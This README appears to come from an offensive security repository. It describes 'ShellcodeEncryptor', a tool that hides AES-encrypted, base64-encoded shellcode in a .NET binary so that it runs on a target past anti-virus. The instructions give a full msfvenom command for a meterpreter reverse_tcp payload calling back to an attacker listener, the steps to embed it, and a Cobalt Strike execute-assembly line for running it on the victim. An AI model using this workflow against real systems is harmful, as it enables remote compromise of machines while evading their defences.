# ShellcodeEncryptor
A simple shell code encryptor/decryptor/executor to bypass anti virus.

**Purpose**
To generate a .Net binary containing base64 encoded, AES encrypted shellcode that will execute on a target, bypassing anti-virus.

If you find the workflow a little cumbersome, feel free to take the code and make something useful of it, but to quote a famous philosopher:
> Life moves pretty fast. If you don't stop and look around once in a while, you could miss it.

**Instructions**

Create a meterpreter payload using `msfvenom`:
```
msfvenom -p windows/meterpreter/reverse_tcp LPORT=443 LHOST=10.10.14.5 -f csharp
```
Copy the byte array and paste it into the shellcode variable in `encryptor.cs`
```
byte[] shellcode = new byte[]
{
... here ...
};
```
Compile it, run it then copy the base64 string. Paste the string into the `shellcodeb64` variable in launcher.cs.
```
string shellcodeb64 = "...here...";
```
Take the resulting executable and run it on the target, for example (Cobalt Strike):
```
execute-assembly ./uploads/launcher.exe
```

Hopefully you will have a meterpreter shell.
